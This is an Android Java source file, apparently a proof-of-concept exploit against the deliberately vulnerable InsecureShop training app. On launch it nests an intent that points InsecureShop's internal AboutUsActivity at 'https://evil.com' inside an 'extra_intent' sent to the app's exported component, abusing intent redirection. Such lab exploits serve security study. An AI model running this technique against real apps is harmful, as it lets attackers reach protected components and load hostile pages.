package com.example.attackerintentredirection;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;



public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent extra = new Intent();
        extra.setClassName("com.insecureshop", "com.insecureshop.AboutUsActivity");
        extra.putExtra("url", "https://evil.com");

        Intent intent = new Intent();
        intent.setClassName("com.insecureshop", "com.insecureshop.CUSTOM_INTENT");
        intent.putExtra("extra_intent", extra);
        startActivity(intent);

    }

}